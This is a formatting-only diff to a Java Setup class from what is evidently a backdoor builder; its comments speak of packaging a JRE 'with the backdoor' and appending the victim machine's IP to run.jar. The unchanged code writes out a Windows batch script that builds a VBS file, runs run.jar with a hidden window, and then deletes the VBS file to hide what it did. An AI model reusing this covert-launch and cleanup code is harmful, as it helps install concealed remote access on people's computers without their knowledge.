@@ -35,7 +35,7 @@ public class Setup {
 	 * 'ip' will contain the internal IP address of the current machine. Otherwise,
 	 * if {@code ipType} is "external", 'ip' will contain the external IP address of
 	 * the current machine.
-	 * 
+	 *
 	 * @param packageJre if a JRE should be packaged with the backdoor
 	 * @param ipType     type of IP address to append to 'run.jar'
 	 * @throws IOException
@@ -68,7 +68,8 @@ public class Setup {
 		PrintWriter out = new PrintWriter(new File(filePath));
 		out.println(
 				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c "
-						+ "jre\\bin\\java -jar run.jar\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 3 > nul\n del run.vbs\n @exit\n"
+						+ "jre\\bin\\java -jar run.jar\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 3 > nul\n del run.vbs\n " +
+						"@exit\n"
 						+ ") else (\ncall:delvbs\n)\ngoto:eof");
 		out.flush();
 		out.close();
@@ -77,7 +78,7 @@ public class Setup {
 	/**
 	 * Appends a new file with name {@code filename} and contents
 	 * {@code fileContents} into existing jar file with name {@code jarFile}.
-	 * 
+	 *
 	 * @param jarFile      name of jar file to append
 	 * @param filename     name of new file to append in jar
 	 * @param fileContents contents of new file to append in jar
